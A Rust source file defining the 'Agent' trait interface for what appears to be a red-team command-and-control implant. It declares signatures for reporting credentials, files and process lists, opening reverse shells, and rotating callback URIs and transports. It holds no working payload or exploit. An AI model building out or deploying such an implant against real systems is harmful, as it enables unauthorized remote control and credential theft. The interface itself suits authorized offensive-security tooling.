#![no_std]
extern crate alloc;

use alloc::collections::{BTreeMap, BTreeSet};
use alloc::string::String;
use alloc::vec::Vec;
use pb::c2;

pub trait Agent: Send + Sync {
    // Interactivity
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String>;
    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String>;
    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String>;
    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String>;
    fn report_task_output(
        &self,
        req: c2::ReportTaskOutputRequest,
    ) -> Result<c2::ReportTaskOutputResponse, String>;
    fn reverse_shell(&self) -> Result<(), String>;
    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String>;
    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String>;
    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String>;

    // Agent Configuration
    fn get_config(&self) -> Result<BTreeMap<String, String>, String>;
    fn get_transport(&self) -> Result<String, String>;
    fn set_transport(&self, transport: String) -> Result<(), String>;
    fn list_transports(&self) -> Result<Vec<String>, String>;
    fn get_callback_interval(&self) -> Result<u64, String>;
    fn set_callback_interval(&self, interval: u64) -> Result<(), String>;
    fn set_callback_uri(&self, uri: String) -> Result<(), String>;
    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String>;
    fn get_active_callback_uri(&self) -> Result<String, String>;
    fn get_next_callback_uri(&self) -> Result<String, String>;
    fn add_callback_uri(&self, uri: String) -> Result<(), String>;
    fn remove_callback_uri(&self, uri: String) -> Result<(), String>;
    fn set_active_callback_uri(&self, uri: String) -> Result<(), String>;

    // Task Management
    fn list_tasks(&self) -> Result<Vec<c2::Task>, String>;
    fn stop_task(&self, task_id: i64) -> Result<(), String>;
}
